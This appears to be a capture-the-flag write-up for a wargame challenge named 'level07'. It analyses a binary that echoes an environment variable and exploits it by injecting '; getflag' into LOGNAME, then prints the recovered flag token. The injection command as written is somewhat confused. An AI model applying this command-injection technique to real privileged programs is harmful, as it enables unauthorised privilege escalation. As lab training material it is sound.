# level07

1. Files found in `~/` :

    ```bash
    ./level07
    ```

2. Binary analysis

    ```bash
    strings level07
    ```

    One line catches our attention :

    ```bash
    /bin/echo %s 
    ```

    The script therefore displays a variable named `level07`. We will grep all environment variables named `level07`, and two are retained :

    ```bash
    USER=level07
    LOGNAME=level07
    ```

3. Exploitation

    Rename `LOGNAME` to escape `echo` and chain `getflag` :

    ```bash
    LOGNAME=; getflag
    ./level07
    ```

    The execution launches `./level07` to execute the expected `echo` command, then `; getflag`.

    ```bash
    echo $LOGNAME; getflag
    ```

4. Token discovered

    The token is : `fiumuikeil55xe9cu4dood66h`
